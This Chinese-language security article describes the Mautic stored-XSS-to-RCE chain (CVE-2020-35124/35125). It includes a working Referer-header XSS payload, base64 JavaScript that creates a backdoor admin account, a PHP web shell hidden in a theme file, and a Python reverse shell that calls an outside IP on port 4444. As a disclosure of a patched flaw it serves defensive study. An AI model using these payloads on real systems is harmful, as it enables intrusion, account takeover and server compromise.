@@ -1,0 +1,318 @@
+![](https://image.3001.net/images/20210210/1612965309_6023e5bd9eb60ade70259.png!small)
+
+## 漏洞概述
+
+Mautic是一款非常热门的开源软件，可以帮助企业实现市场营销自动化。近期，研究人员在GitHub上研究该应用程序并分析其源代码时，发现了一个攻击链。通过利用其中的安全漏洞，未经身份验证的攻击者可以通过利用存储型XSS漏洞在托管了Mautic的服务器上实现远程代码执行。目前，该漏洞的CVE已被分配为[
+_CVE-2020-35124_](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124)和[
+_CVE-2020-35125_](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124)，并已在Mautic v3.2.4版本中成功修复。
+
+## 漏洞影响
+
+该漏洞是一个高危漏洞，未经身份验证的攻击者可以通过利用存储型XSS漏洞在托管了Mautic的服务器上实现远程代码执行。
+
+截止本文发稿时，已有大约六千个Mautic实例受到了该漏洞的影响：
+
+![](https://image.3001.net/images/20210210/1612965326_6023e5ce16dead898db21.png!small)
+
+## 关于Mautic
+
+Mautic是一款功能强大的开源营销自动化软件，它也是目前全球最热门的营销自动化软件。该软件目前用户已超20万，提供了35种语言的不同版本。Mautic作为国外最强大的开源自动营销系统，其拥有不亚于国内任何商业版自动营销的功能，并且在在不断的进行功能迭代和更新。其源代码开放支持二次开发，私有化部署让用户数据，企业营销数据等核心数据保存在自己的服务器上。除此之外，Mautic还可以依据用户行为，营销行为，用户属性，企业属性等超过100种数据维度制定自定义的可视化营销流程，满足企业的营销需求，大幅度提高营销效率，节约时间和成本。
+
+一个完整的营销自动化系统国内一般收费是一年大几十万（每年哦），而且数据是在服务商云服务器的，如果不续费数据就没有了。Mautic开源免费的营销自动化系统功能完全不逊于那些商业的营销自动化系统，而且数据是在企业自己服务器的，源代码也是开放的，支持企业进行二次开发。
+
+## 漏洞发现
+
+作为一个营销自动化平台，Mautic允许用户收集线索并跟踪他们对不同类型内容的参与度。在这里，有两种类型的内容值得关注：资产和表单。“资产”只是一个潜在客户可以下载的文件。潜在客户将获得一个下载资产的链接，当潜在客户单击该链接时，该资产将直接从Mautic应用程序下载。表单则是用户可以设置的由Mautic或第三方站点托管的东西。当潜在客户填写并提交表单时，表单将通过对Mautic应用程序的API调用提交回来。
+
+这就非常有意思了，因为这意味着Mautic的攻击面比一个普通的Web应用程序更广。我们不仅需要考虑Mautic中的用户，因为他们通常会在Web应用程序中进行身份验证，而且还需要考虑通过外部内容与Web应用程序交互的未经身份验证的潜在客户。
+
+当我们在查看Mautic界面时，我们寻找了可能受潜在客户影响的数据，其中一个突出的问题是，推荐人的信息会在许多地方出现。“推荐人”是指当他们下载资产或提交表单时，潜在客户来自的第三方网站。只要潜在客户点击下载链接或提交表单，Mautic就可以通过捕捉和存储HTTP
+Referer Header来跟踪这部分信息。比如说，“Downloads of all Assets”的报告页面将显示“Top Referrers”：
+
+![](https://image.3001.net/images/20210210/1612965346_6023e5e20beac4febb36d.png!small)
+
+虽然浏览器会根据用户所在的网站自动设置HTTP Referer
+Header，但没有任何东西可以阻止用户去操作这个Header。通过研究发现，未经身份验证的攻击者可以提供一个包含XSS Payload的HTTP
+Referer Header，并让Mautic存储它。如果Mautic中的合法用户查看了一个页面，而其中又出现了Referer数据的话，那么将会触发XSS
+Payload，这将允许攻击者以Mautic用户的身份执行任意JavaScript代码。
+
+在下面给出的例子中，攻击者发送了一个简单的XSS Payload：
+
+    
+    
+    sh-3.2# curl -o test.pdf -v 'http://192.168.0.116/asset/1:testpdf' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H $'Referer: http://<img/src="doesnotexist.jpg"onerror="eval(window.atob(\'YWxlcnQoJ3hzcycp\'))">'
+
+其中eval()函数中包含了Base64编码的Payload，即"alert('xss')"。
+
+当合法的Mautic用户访问“Download of All Assets”页面时，TA将会看到如下图所示的情况：
+
+![](https://image.3001.net/images/20210210/1612965365_6023e5f569b8a76bdff82.png!small)
+
+对于Mautic表单，我们发现表单变量mautic[return]包含了referrer信息，并且存在XSS Payload注入问题。
+
+## 漏洞利用
+
+### 识别资产和表单
+
+从一开始，查看Mautic站点的攻击者首先需要能够识别要攻击的表单和资产。这很容易实现，因为表单和资产由自动递增的整数标识。要识别Mautic表单或资产，攻击者只需按整数id顺序枚举表单和资产，即可找到有效的表单和资产，这也就是传说中的不安全的直接对象引用（IDOR）。这本身不是一个严重的问题，除非还存在其他应用程序漏洞。
+
+特别是对于Mautic资产，完整的下载URL包括资产的“别名”，这是它的简称。但是我们发现，如果在向Mautic请求资产id的时候后面只跟一个“：”的话，Mautic则会自动重定向到完整的资产下载URL，如下面的Location
+Header所示。这样一来，攻击者就可以枚举出完整的资产列表了，而枚举Mautic表单则不需要这个额外的步骤：
+
+    
+    
+    sh-3.2# curl -v http://192.168.0.116/asset/1:
+    
+    *   Trying 192.168.0.116...
+    
+    * TCP_NODELAY set
+    
+    * Connected to 192.168.0.116 (192.168.0.116) port 80 (#0)
+    
+    > GET /asset/1: HTTP/1.1
+    
+    > Host: 192.168.0.116
+    
+    > User-Agent: curl/7.64.1
+    
+    > Accept: */*
+    
+    >
+    
+    < HTTP/1.1 301 Moved Permanently
+    
+    < Date: Sat, 16 Jan 2021 18:11:30 GMT
+    
+    < Server: Apache
+    
+    < X-Powered-By: PHP/7.3.25
+    
+    < X-Frame-Options: SAMEORIGIN
+    
+    < Vary: Cookie
+    
+    < Location: /asset/1:testpdf
+    
+    < Transfer-Encoding: chunked
+    
+    < Content-Type: text/html; charset=UTF-8
+    
+    <
+    
+    < ... TRUNCATED ... >
+
+### 创建一个管理员用户
+
+通过识别资产或表单，攻击者可以创建XSS Payload。现在，我们想要构造一个XSS
+Payload，并在合法的Mautic管理员用户查看“Downloads of all Assets”报告时自动创建一个管理员用户。
+
+下图显示的是在Mautic接口的“Users - New User”页面创建一个管理员用户：
+
+![](https://image.3001.net/images/20210210/1612965400_6023e61881954492953e9.png!small)
+
+这个页面有两个令牌保护：一个Ajax CSRF令牌和一个用户CSRF令牌。所以XSS Payload中的第一步就是获取“Users - New
+User”页面并提取CSRF令牌。这部分代码如下所示：
+
+    
+    
+    function getTokens() {
+    
+        xhttp = new XMLHttpRequest();
+    
+        xhttp.open('GET', '/s/users/new', false)
+    
+        xhttp.send();
+    
+        t=xhttp.responseText;
+    
+        csrfToken = t.split('mauticAjaxCsrf')[1].split("'")[1].split("'")[0];
+    
+        userToken = t.split('name="user[_token]"')[1].split('value="')[1].split('"')[0];
+    
+        return [csrfToken, userToken]
+    
+    }
+
+下一步就是使用管理员权限创建一个用户了，这部分代码如下所示：
+
+    
+    
+    function createUser(tokens) {
+    
+        xcreate = new XMLHttpRequest();
+    
+        xcreate.open('POST', '/s/users/new', false);
+    
+        xcreate.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    
+        xcreate.setRequestHeader('X-CSRF-Token', tokens[0]);
+    
+        payload='user%5BfirstName%5D=Mautic-IT&user%5BlastName%5D=User&user%5Brole%5D=1&user%5Bposition%5D=&user%5Bsignature%5D=Best+regards%2C+%7CFROM_NAME%7C&user%5Busername%5D=mautic-it&user%5Bemail%5D=mautic-it%40example.com&user%5BplainPassword%5D%5Bpassword%5D=test123&user%5BplainPassword%5D%5Bconfirm%5D=test123&user%5Btimezone%5D=&user%5Blocale%5D=&user%5BisPublished%5D=1&user%5Bbuttons%5D%5Bsave%5D=&user%5B_token%5D=' + tokens[1];
+    
+        xcreate.send(payload);
+    
+    }
+    
+    createUser(getTokens());
+
+上述代码将创建一个用户名为mutic-it的用户，密码为test123，并分配管理员权限。
+
+我们将其整合进XSS Payload中：
+
+    
+    
+    sh-3.2# curl -o test.pdf -v 'http://192.168.0.116/asset/1:testpdf' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H $'Referer: http://<img/src="doesnotexist.jpg"onerror="eval(window.atob(\'ZnVuY3Rpb24gZ2V0VG9rZW5zKCkgewogICAgeGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgIHhodHRwLm9wZW4oJ0dFVCcsICcvcy91c2Vycy9uZXcnLCBmYWxzZSkKICAgIHhodHRwLnNlbmQoKTsKICAgIHQ9eGh0dHAucmVzcG9uc2VUZXh0OwogICAgY3NyZlRva2VuID0gdC5zcGxpdCgnbWF1dGljQWpheENzcmYnKVsxXS5zcGxpdCgiJyIpWzFdLnNwbGl0KCInIilbMF07CiAgICB1c2VyVG9rZW4gPSB0LnNwbGl0KCduYW1lPSJ1c2VyW190b2tlbl0iJylbMV0uc3BsaXQoJ3ZhbHVlPSInKVsxXS5zcGxpdCgnIicpWzBdOwogICAgcmV0dXJuIFtjc3JmVG9rZW4sIHVzZXJUb2tlbl0KfQpmdW5jdGlvbiBjcmVhdGVVc2VyKHRva2VucykgewogICAgeGNyZWF0ZSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGNyZWF0ZS5vcGVuKCdQT1NUJywgJy9zL3VzZXJzL25ldycsIGZhbHNlKTsKICAgIHhjcmVhdGUuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOwogICAgeGNyZWF0ZS5zZXRSZXF1ZXN0SGVhZGVyKCdYLUNTUkYtVG9rZW4nLCB0b2tlbnNbMF0pOwogICAgcGF5bG9hZD0ndXNlciU1QmZpcnN0TmFtZSU1RD1NYXV0aWMtSVQmdXNlciU1Qmxhc3ROYW1lJTVEPVVzZXImdXNlciU1QnJvbGUlNUQ9MSZ1c2VyJTVCcG9zaXRpb24lNUQ9JnVzZXIlNUJzaWduYXR1cmUlNUQ9QmVzdCtyZWdhcmRzJTJDKyU3Q0ZST01fTkFNRSU3QyZ1c2VyJTVCdXNlcm5hbWUlNUQ9bWF1dGljLWl0JnVzZXIlNUJlbWFpbCU1RD1tYXV0aWMtaXQlNDBleGFtcGxlLmNvbSZ1c2VyJTVCcGxhaW5QYXNzd29yZCU1RCU1QnBhc3N3b3JkJTVEPXRlc3QxMjMmdXNlciU1QnBsYWluUGFzc3dvcmQlNUQlNUJjb25maXJtJTVEPXRlc3QxMjMmdXNlciU1QnRpbWV6b25lJTVEPSZ1c2VyJTVCbG9jYWxlJTVEPSZ1c2VyJTVCaXNQdWJsaXNoZWQlNUQ9MSZ1c2VyJTVCYnV0dG9ucyU1RCU1QnNhdmUlNUQ9JnVzZXIlNUJfdG9rZW4lNUQ9JyArIHRva2Vuc1sxXTsKICAgIHhjcmVhdGUuc2VuZChwYXlsb2FkKTsKfQpjcmVhdGVVc2VyKGdldFRva2VucygpKTs=\'))">'
+
+此时，当合法的Mautic管理员用户查看“Top Referrers”报告时，将会触发XSS Payload，并创建另一个管理员用户。
+
+![](https://image.3001.net/images/20210210/1612965452_6023e64cba447aeb91121.png!small)
+
+![](https://image.3001.net/images/20210210/1612965461_6023e655d7a04e0060a82.png!small)
+
+### 通过自定义主题实现远程代码执行
+
+当管理员访问一个复杂的Web应用程序时，通常会涉及到在托管应用程序的服务器上获得远程代码执行权限。对于Mautic，我们发现可以通过上传恶意的自定义主题来获得远程代码执行权限。这本身不是一个漏洞，而是应用程序中的一个可能被攻击者利用的功能，这也是很多内容管理系统中常见的攻击向量。
+
+Mautic文档描述了一种创建包含自定义表单字段主题的方法，表单字段的描述由主题zip文件中的PHP文件给出，这是嵌入Web Shell的一个绝佳位置。
+
+Mautic自带了几个内置主题，我们修改了GitHub中的Cards主题，并添加了一个名为date.html.php的文件，其中包含有名为“Date”的自定义字段和一个Web
+Shell：
+
+    
+    
+    <?php
+    
+    echo shell_exec($_GET['cmd'].' 2>&1');
+    
+     
+    
+    echo $view->render(
+    
+        'MauticFormBundle:Field:text.html.php',
+    
+        [
+    
+            'field'    => $field,
+    
+            'inForm'   => (isset($inForm)) ? $inForm : false,
+    
+            'type'     => 'date',
+    
+            'id'       => $id,
+    
+            'formId'   => (isset($formId)) ? $formId : 0,
+    
+            'formName' => (isset($formName)) ? $formName : '',
+    
+        ]
+    
+    );
+
+我们将其压缩为bad-theme.zip，其结构如下：
+
+    
+    
+    sh-3.2# unzip -l bad-theme.zip
+    
+    Archive: bad-theme.zip
+    
+      Length      Date    Time    Name
+    
+    ---------  ---------- -----   ----    
+          118  12-07-2020 23:10   config.json
+    
+            0  12-07-2020 21:46   html/
+    
+          263  12-07-2020 21:46   html/message.html.twig
+    
+          393  12-07-2020 21:46   html/base.html.twig
+    
+            0  12-07-2020 22:56   html/MauticFormBundle/
+    
+            0  12-07-2020 22:56   html/MauticFormBundle/Field/
+    
+          583  12-07-2020 22:56   html/MauticFormBundle/Field/date.html.php
+    
+            0  12-07-2020 21:46   html/MauticFormBundle/Builder/
+    
+         2071  12-07-2020 21:46   html/MauticFormBundle/Builder/style.html.twig
+    
+        51320  12-07-2020 21:46   html/email.html.twig
+    
+        44004  12-07-2020 21:46   thumbnail.png
+    
+            0  12-07-2020 21:46   assets/
+    
+         2269  12-07-2020 21:46   assets/logo_black.png
+    
+       141389  12-07-2020 21:46   assets/background_look.jpg
+    
+       115977  12-07-2020 21:46   assets/placeholder_coffee.jpg
+    
+       302632  12-07-2020 21:46   assets/placeholder_coffee.png
+    
+       105452  12-07-2020 21:46   assets/background_face.jpg
+    
+         1517  12-07-2020 21:46   assets/icon_social.png
+    
+            0  12-07-2020 21:46   assets/open-sans/
+    
+       101756  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBold.WOFF
+    
+       221164  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBold.ttf
+    
+        97828  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBoldItalic.WOFF
+    
+       212760  12-07-2020 21:46   assets/open-sans/OpenSans-Italic.ttf
+    
+        97180  12-07-2020 21:46   assets/open-sans/OpenSans-Italic.WOFF
+    
+       212732  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBoldItalic.ttf
+    
+        99416  12-07-2020 21:46   assets/open-sans/OpenSans-Regular.WOFF
+    
+       217276  12-07-2020 21:46   assets/open-sans/OpenSans-Regular.ttf
+    
+    ---------                     -------    
+      2028100                     27 files
+
+为了激活主题，还需要修改Mautic主题配置以允许我们上传PHP文件：
+
+![](https://image.3001.net/images/20210210/1612965497_6023e67993b6a15d80381.png!small)
+
+接下来，上传主题zip文件：
+
+![](https://image.3001.net/images/20210210/1612965505_6023e68190c8029611266.png!small)
+
+启用该主题：
+
+![](https://image.3001.net/images/20210210/1612965513_6023e68910061f2416c5e.png!small)
+
+为了激活Web Shell，我们首先需要使用自定义Date字段创建一个表单，然后再对其进行编辑。Web
+Shell会在/s/forms/edit/<form_id>页面被激活。下图中，我们导出了Mautic服务器中/etc/passwd文件的内容：
+
+![](https://image.3001.net/images/20210210/1612965520_6023e690743034c645805.png!small)
+
+我们还可以使用一个Python反向Shell来升级原Web Shell：
+
+    
+    
+    http://192.168.0.116/s/forms/edit/1?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.0.105%22%2c4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27
+
+![](https://image.3001.net/images/20210210/1612965531_6023e69b2b86c299ac6a7.png!small)
+
+## 总结
+
+这个漏洞将允许攻击者做很多事情。云环境中的一个常见目标是枚举云元数据URL以窃取访问密钥。在混合云场景中，如果没有适当的网络分段控制，攻击者可能会进入受害者的内部网络。
+
+## 参考资料
+
+> [
+> _https://github.com/mautic/mautic/security/advisories_](https://github.com/mautic/mautic/security/advisories)
+>
+> [ _https://www.mautic.org/blog/community/security-release-all-versions-> mautic-> prior-2-16-5-and-3-2-4_](https://www.mautic.org/blog/community/security-> release-all-versions-mautic-prior-2-16-5-and-3-2-4)
+>
+> [ _https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-35124_](https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-35124)
+>
+> [ _https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-35125_](https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2020-35125)
+
